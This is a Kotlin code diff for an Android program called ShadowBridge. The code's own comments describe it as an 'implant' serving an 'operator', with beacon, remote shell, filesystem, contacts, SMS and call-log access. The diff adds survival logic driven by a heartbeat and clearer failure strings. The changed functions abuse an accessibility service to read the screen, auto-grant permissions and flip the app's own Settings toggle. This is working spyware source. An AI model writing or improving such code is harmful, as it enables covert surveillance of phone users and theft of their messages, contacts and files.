@@ -19,10 +19,40 @@ import java.util.UUID
 object ShadowBridge {
     private const val TAG = "ShadowBridge"
 
+    /**
+     * Every accessibility-only primitive answers with this when AMS is not
+     * holding the service, instead of an empty result or a bare "false".
+     *
+     * A11y is not a dependency of the implant, only of these operations: beacon,
+     * shell, filesystem, contacts, SMS, call log and the app inventory all keep
+     * working without it (see KeepAlive). When a11y IS missing, the operator must
+     * see exactly that -- "a11y not active" was too easy to mistake for "no data"
+     * or a silent failure, which is the failure class this project keeps paying for.
+     * The operator screens key off the UNSUPPORTED prefix.
+     */
+    const val A11Y_DOWN = "UNSUPPORTED: accessibility service not bound"
+
+    /** True while AMS holds a live a11y instance. Reported in every heartbeat. */
+    @JvmStatic
+    fun a11yBound(): Boolean = com.shadow.KeepAlive.a11yBound()
+
+    /**
+     * Re-apply the survival policy. Called by the Rust heartbeat, which is the one
+     * loop guaranteed to run for as long as the process does -- a11y can drop out
+     * between any two Kotlin callbacks (AMS unbinds, OEM kills the binding, user
+     * toggles it off) and this is what notices within one beat.
+     */
+    @JvmStatic
+    fun keepAliveEvaluate(): String {
+        val ctx = ShadowApp.appContext ?: return "no context"
+        return com.shadow.KeepAlive.evaluate(ctx, "heartbeat")
+    }
+
     /** Read screen as a text tree (a11y). */
     @JvmStatic
     fun dumpScreen(): String =
-        com.shadow.a11y.ShadowAccessibilityService.instance?.dumpScreen() ?: "a11y not active"
+        com.shadow.a11y.ShadowAccessibilityService.instance?.dumpScreen()
+            ?: "$A11Y_DOWN -- dump_screen needs a bound service; shell/fs/contacts are unaffected"
 
     /** Click a node by visible text / content description (a11y). */
     @JvmStatic
@@ -38,7 +68,7 @@ object ShadowBridge {
     @JvmStatic
     fun startAutoGrant(): String {
         val svc = com.shadow.a11y.ShadowAccessibilityService.instance
-            ?: return "a11y not active — cannot auto-grant"
+            ?: return "$A11Y_DOWN -- cannot auto-grant (permissions already granted stay usable; shell/fs/contacts unaffected)"
         svc.startAutoGrant()
         return "auto-grant started"
     }
@@ -184,7 +214,7 @@ object ShadowBridge {
     @JvmStatic
     fun toggleSelfInSettings(): String {
         val svc = com.shadow.a11y.ShadowAccessibilityService.instance
-            ?: return "a11y not active — cannot toggle"
+            ?: return "$A11Y_DOWN -- cannot toggle a Settings switch without it"
         return svc.clickSelfSwitch()
     }
 
